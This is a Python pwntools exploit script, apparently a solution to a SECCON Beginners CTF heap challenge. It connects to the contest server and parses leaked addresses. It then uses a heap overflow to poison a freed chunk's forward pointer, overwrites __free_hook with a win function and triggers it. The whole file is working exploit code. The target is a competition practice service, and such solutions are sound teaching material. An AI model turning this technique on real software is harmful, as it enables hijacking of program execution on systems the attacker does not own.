#!/usr/bin/env python
from pwn import *

def read(content):
    s.sendlineafter('\n> ', '1')
    time.sleep(0.1)
    s.send(content)

def malloc(content):
    s.sendlineafter('\n> ', '2')
    time.sleep(0.1)
    s.send(content)

def free():
    s.sendlineafter('\n> ', '3')

s = remote('bh.quals.beginners.seccon.jp', 9002)

s.recvuntil('<__free_hook>: ')
free_hook = int(s.recvline(False), 0x10)
s.recvuntil('<win>: ')
win = int(s.recvline(False), 0x10)

malloc('A')
free()
read('A' * 0x18 + p64(0x21) + p64(free_hook))
malloc('A')
read('A' * 0x18 + p64(0x31))
free()
malloc(p64(win))
free()
s.stream()
